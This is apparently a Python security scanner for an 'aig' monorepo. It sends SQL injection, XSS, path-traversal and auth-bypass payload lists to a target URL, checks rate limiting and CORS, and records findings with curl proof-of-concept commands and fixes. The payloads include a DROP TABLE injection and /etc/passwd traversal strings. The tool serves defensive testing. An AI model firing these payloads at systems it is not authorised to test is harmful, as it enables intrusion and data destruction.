#!/usr/bin/env python3
"""
Penetration Testing Suite for aig Monorepo
Tests: SQL injection, XSS, Path traversal, Auth bypass, Rate limiting, CORS
Output: findings with POC
"""

import argparse
import asyncio
import json
import sys
from dataclasses import asdict, dataclass
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin

import aiohttp


@dataclass
class PenTestFinding:
    test_name: str
    category: str
    severity: str
    endpoint: str
    method: str
    payload: str
    evidence: str
    description: str
    poc: str
    remediation: str


class PenTester:
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "admin' #",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; DROP TABLE users--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "' OR SLEEP(5)--",
        "' WAITFOR DELAY '0:0:5'--",
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio><source onerror=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
    ]

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/www/../../etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]

    AUTH_BYPASS_PAYLOADS = [
        {"username": "admin'--", "password": "anything"},
        {"username": "admin' #", "password": "anything"},
        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
        {"username": "admin", "password": "' OR '1'='1'--"},
        {"username": "admin", "password": "';--"},
        {"username": "admin", "password": "' OR 1=1--"},
        {"username": "admin'/*", "password": "admin'/*"},
    ]

    def __init__(self, base_url: str, output_dir: Path, auth_token: str | None = None):
        self.base_url = base_url.rstrip("/")
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.auth_token = auth_token
        self.findings: list[PenTestFinding] = []
        self.session: aiohttp.ClientSession | None = None
        self.endpoints: list[dict] = []

    async def __aenter__(self):
        headers = {"User-Agent": "aig-PenTest/1.0"}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        self.session = aiohttp.ClientSession(headers=headers)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    def discover_endpoints(self) -> list[dict]:
        """Discover API endpoints from OpenAPI spec or common paths"""
        endpoints = []

        common_paths = [
            "/api/health",
            "/api/v1/health",
            "/health",
            "/api/users",
            "/api/v1/users",
            "/api/auth/login",
            "/api/v1/auth/login",
            "/api/auth/register",
            "/api/v1/auth/register",
            "/api/files",
            "/api/v1/files",
            "/api/upload",
            "/api/v1/upload",
            "/api/search",
            "/api/v1/search",
            "/api/admin",
            "/api/v1/admin",
            "/graphql",
            "/api/graphql",
        ]

        for path in common_paths:
            endpoints.append({
                "path": path,
                "method": "GET",
                "params": {}
            })
            endpoints.append({
                "path": path,
                "method": "POST",
                "params": {}
            })

        return endpoints

    async def test_endpoint(self, endpoint: dict, payload: str, param_name: str = "q") -> PenTestFinding | None:
        """Test a single endpoint with a payload"""
        if not self.session:
            return None

        url = urljoin(self.base_url, endpoint["path"])
        method = endpoint["method"]

        try:
            if method == "GET":
                params = endpoint.get("params", {}).copy()
                params[param_name] = payload
                async with self.session.get(url, params=params) as resp:
                    text = await resp.text()
                    return self._analyze_response(endpoint, payload, text, resp.status)
            else:
                data = endpoint.get("params", {}).copy()
                data[param_name] = payload
                async with self.session.post(url, json=data) as resp:
                    text = await resp.text()
                    return self._analyze_response(endpoint, payload, text, resp.status)
        except Exception as e:
            print(f"[PenTest] Error testing {url}: {e}")
        return None

    def _analyze_response(self, endpoint: dict, payload: str, response: str, status: int) -> PenTestFinding | None:
        """Analyze response for vulnerability indicators"""
        response_lower = response.lower()

        sql_errors = [
            "sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlite3",
            "syntax error", "unclosed quotation", "unterminated string",
            "division by zero", "warning: mysql", "pg_query",
            "microsoft ole db", "odbc driver", "jdbc driver"
        ]

        xss_indicators = [
            "<script>alert('xss')</script>",
            "onerror=alert",
            "onload=alert",
            "javascript:alert"
        ]

        path_indicators = [
            "root:x:0:0",
            "daemon:x:1:1",
            "bin:x:2:2",
            "[drivers]",
            "localhost",
            "127.0.0.1"
        ]

        auth_indicators = [
            "welcome admin",
            "admin panel",
            "dashboard",
            "logout",
            "session",
            "token",
            "authenticated"
        ]

        if any(err in response_lower for err in sql_errors):
            return PenTestFinding(
                test_name="SQL Injection",
                category="injection",
                severity="critical",
                endpoint=endpoint["path"],
                method=endpoint["method"],
                payload=payload,
                evidence=response[:500],
                description="SQL error message leaked in response",
                poc=f"curl -X {endpoint['method']} '{self.base_url}{endpoint['path']}?q={payload}'",
                remediation="Use parameterized queries, input validation, and ORM"
            )

        if any(xss in response_lower for xss in xss_indicators):
            return PenTestFinding(
                test_name="Cross-Site Scripting (XSS)",
                category="xss",
                severity="high",
                endpoint=endpoint["path"],
                method=endpoint["method"],
                payload=payload,
                evidence=response[:500],
                description="XSS payload reflected in response",
                poc=f"curl -X {endpoint['method']} '{self.base_url}{endpoint['path']}?q={payload}'",
                remediation="Implement output encoding, CSP headers, input validation"
            )

        if any(path in response_lower for path in path_indicators):
            return PenTestFinding(
                test_name="Path Traversal",
                category="path_traversal",
                severity="high",
                endpoint=endpoint["path"],
                method=endpoint["method"],
                payload=payload,
                evidence=response[:500],
                description="Directory traversal successful - system files exposed",
                poc=f"curl -X {endpoint['method']} '{self.base_url}{endpoint['path']}?file={payload}'",
                remediation="Validate and sanitize file paths, use allowlists, restrict filesystem access"
            )

        if any(auth in response_lower for auth in auth_indicators) and "admin" in payload.lower():
            return PenTestFinding(
                test_name="Authentication Bypass",
                category="auth_bypass",
                severity="critical",
                endpoint=endpoint["path"],
                method=endpoint["method"],
                payload=payload,
                evidence=response[:500],
                description="Authentication bypass possible with crafted credentials",
                poc=f"curl -X POST '{self.base_url}{endpoint['path']}' -d '{payload}'",
                remediation="Use parameterized queries, proper authentication, rate limiting"
            )

        return None

    async def test_sqli(self):
        """Test SQL Injection on all endpoints"""
        print("[PenTest] Testing SQL Injection...")
        endpoints = self.discover_endpoints()

        for endpoint in endpoints:
            for payload in self.SQLI_PAYLOADS:
                finding = await self.test_endpoint(endpoint, payload, "id")
                if finding:
                    self.findings.append(finding)
                    print(f"  [CRITICAL] SQLi found at {endpoint['path']}")

                await asyncio.sleep(0.1)

    async def test_xss(self):
        """Test XSS on all endpoints"""
        print("[PenTest] Testing XSS...")
        endpoints = self.discover_endpoints()

        for endpoint in endpoints:
            for payload in self.XSS_PAYLOADS:
                finding = await self.test_endpoint(endpoint, payload, "search")
                if finding:
                    self.findings.append(finding)
                    print(f"  [HIGH] XSS found at {endpoint['path']}")

                await asyncio.sleep(0.1)

    async def test_path_traversal(self):
        """Test Path Traversal"""
        print("[PenTest] Testing Path Traversal...")
        endpoints = self.discover_endpoints()

        file_endpoints = [e for e in endpoints if "file" in e["path"].lower() or "upload" in e["path"].lower() or "download" in e["path"].lower()]
        if not file_endpoints:
            file_endpoints = endpoints[:5]

        for endpoint in file_endpoints:
            for payload in self.PATH_TRAVERSAL_PAYLOADS:
                finding = await self.test_endpoint(endpoint, payload, "file")
                if finding:
                    self.findings.append(finding)
                    print(f"  [HIGH] Path traversal found at {endpoint['path']}")

                await asyncio.sleep(0.1)

    async def test_auth_bypass(self):
        """Test Authentication Bypass"""
        print("[PenTest] Testing Authentication Bypass...")
        auth_endpoints = [
            {"path": "/api/auth/login", "method": "POST"},
            {"path": "/api/v1/auth/login", "method": "POST"},
            {"path": "/login", "method": "POST"},
            {"path": "/api/admin/login", "method": "POST"},
        ]

        for endpoint in auth_endpoints:
            for payload in self.AUTH_BYPASS_PAYLOADS:
                if not self.session:
                    break
                try:
                    url = urljoin(self.base_url, endpoint["path"])
                    async with self.session.post(url, json=payload) as resp:
                        text = await resp.text()
                        if resp.status == 200 and ("token" in text.lower() or "session" in text.lower()):
                            finding = PenTestFinding(
                                test_name="Authentication Bypass",
                                category="auth_bypass",
                                severity="critical",
                                endpoint=endpoint["path"],
                                method=endpoint["method"],
                                payload=json.dumps(payload),
                                evidence=text[:500],
                                description="Authentication bypassed with SQL injection in credentials",
                                poc=f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(payload)}'",
                                remediation="Use parameterized queries, implement proper authentication, account lockout"
                            )
                            self.findings.append(finding)
                            print(f"  [CRITICAL] Auth bypass at {endpoint['path']}")
                except Exception:
                    pass
                await asyncio.sleep(0.1)

    async def test_rate_limiting(self):
        """Test Rate Limiting"""
        print("[PenTest] Testing Rate Limiting...")
        test_endpoint = {"path": "/api/health", "method": "GET"}

        if not self.session:
            return

        try:
            url = urljoin(self.base_url, test_endpoint["path"])
            blocked = False
            for _i in range(100):
                async with self.session.get(url) as resp:
                    if resp.status == 429:
                        blocked = True
                        break
                await asyncio.sleep(0.01)

            if not blocked:
                finding = PenTestFinding(
                    test_name="Missing Rate Limiting",
                    category="rate_limiting",
                    severity="medium",
                    endpoint=test_endpoint["path"],
                    method=test_endpoint["method"],
                    payload="100 rapid requests",
                    evidence="No 429 response after 100 requests",
                    description="Endpoint lacks rate limiting - vulnerable to DoS/brute force",
                    poc=f"for i in {{1..100}}; do curl '{url}'; done",
                    remediation="Implement rate limiting (sliding window), use Redis for distributed deployments"
                )
                self.findings.append(finding)
                print(f"  [MEDIUM] No rate limiting on {test_endpoint['path']}")
        except Exception:
            pass

    async def test_cors(self):
        """Test CORS Misconfiguration"""
        print("[PenTest] Testing CORS...")
        test_endpoint = {"path": "/api/health", "method": "GET"}

        if not self.session:
            return

        try:
            url = urljoin(self.base_url, test_endpoint["path"])
            headers = {"Origin": "https://evil.com"}

            async with self.session.options(url, headers=headers) as resp:
                cors_origin = resp.headers.get("Access-Control-Allow-Origin", "")
                cors_credentials = resp.headers.get("Access-Control-Allow-Credentials", "")

                if cors_origin == "*" and cors_credentials == "true":
                    finding = PenTestFinding(
                        test_name="CORS Misconfiguration",
                        category="cors",
                        severity="high",
                        endpoint=test_endpoint["path"],
                        method="OPTIONS",
                        payload="Origin: https://evil.com",
                        evidence=f"Allow-Origin: {cors_origin}, Allow-Credentials: {cors_credentials}",
                        description="CORS allows any origin with credentials - CSRF/data theft risk",
                        poc=f"curl -H 'Origin: https://evil.com' -X OPTIONS '{url}' -v",
                        remediation="Restrict Access-Control-Allow-Origin to specific domains, never use * with credentials"
                    )
                    self.findings.append(finding)
                    print(f"  [HIGH] CORS misconfiguration on {test_endpoint['path']}")
                elif cors_origin and cors_origin != "*":
                    print(f"  [INFO] CORS restricted to: {cors_origin}")
        except Exception:
            pass

    async def run_all_tests(self):
        """Run all penetration tests"""
        await self.test_sqli()
        await self.test_xss()
        await self.test_path_traversal()
        await self.test_auth_bypass()
        await self.test_rate_limiting()
        await self.test_cors()

    def save_results(self):
        """Save findings"""
        output = {
            "scan_metadata": {
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "target": self.base_url,
                "scanner_version": "1.0.0",
                "total_findings": len(self.findings),
                "by_severity": self._count_by_severity(),
                "by_category": self._count_by_category()
            },
            "findings": [asdict(f) for f in self.findings]
        }

        json_file = self.output_dir / "penetration_test_results.json"
        json_file.write_text(json.dumps(output, indent=2, default=str))
        print(f"[PenTest] Results saved to {json_file}")

    def _count_by_severity(self) -> dict[str, int]:
        counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        for f in self.findings:
            counts[f.severity] = counts.get(f.severity, 0) + 1
        return counts

    def _count_by_category(self) -> dict[str, int]:
        counts = {}
        for f in self.findings:
            counts[f.category] = counts.get(f.category, 0) + 1
        return counts

    def get_exit_code(self) -> int:
        has_critical = any(f.severity == "critical" for f in self.findings)
        has_high = any(f.severity == "high" for f in self.findings)
        if has_critical:
            return 2
        elif has_high:
            return 1
        return 0


async def main():
    parser = argparse.ArgumentParser(description="Penetration Testing Suite")
    parser.add_argument("--target", required=True, help="Target base URL (e.g., http://localhost:8000)")
    parser.add_argument("--output-dir", default="security-reports/penetration", help="Output directory")
    parser.add_argument("--auth-token", help="Bearer token for authenticated tests")
    args = parser.parse_args()

    output_dir = Path(args.output_dir).resolve()

    async with PenTester(args.target, output_dir, args.auth_token) as tester:
        await tester.run_all_tests()
        tester.save_results()
        sys.exit(tester.get_exit_code())


if __name__ == "__main__":
    asyncio.run(main())
